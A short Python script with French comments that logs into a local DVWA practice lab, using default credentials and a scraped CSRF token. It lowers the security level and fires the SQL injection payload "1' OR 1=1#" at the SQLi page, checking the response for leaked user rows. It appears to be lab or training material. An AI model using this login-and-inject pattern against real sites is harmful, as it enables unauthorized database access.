#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

# URLs
base_url = "http://localhost/dvwa/"
login_url = base_url + "login.php"
sqli_url = base_url + "vulnerabilities/sqli"
security_url = base_url + "security.php"

# Création de session
session = requests.Session()

# 1. Récupérer le token CSRF depuis login.php
login_page = session.get(login_url)
soup = BeautifulSoup(login_page.text, "html.parser")
token = soup.find("input", {"name": "user_token"})["value"]

# 2. Connexion
login_data = {
	"username": "admin",
	"password": "password",
	"Login": "Login",
	"user_token": token
}
login_response = session.post(login_url, data=login_data)
#print(login_response.text)
if "Login failed" in login_response.text:
	print("[!] Échec de connexion.")
	exit()

print("[+] Connexion réussie.")
sec_page = session.get(security_url)
soup = BeautifulSoup(sec_page.text, "html.parser")
token = soup.find("input", {"name": "user_token"})["value"]
session.post(security_url, data={"security": "low", "seclev_submit": "Submit", "user_token": token})


# 4. Tester les payloads SQLi
payloads = [
    
	"1' OR 1=1#"
    

]

for payload in payloads:
	params = {"id": payload, "Submit": "Submit"}
	response = session.get(sqli_url, params=params)
	#print(response.text)
# Basic keyword check (can be customized based on the application output)
	if "Gordon" in response.text or "Surname" in response.text:
    	print(f"[+] Succès avec: {payload}")
	else:
    	print(f"[-] Échec avec: {payload}")


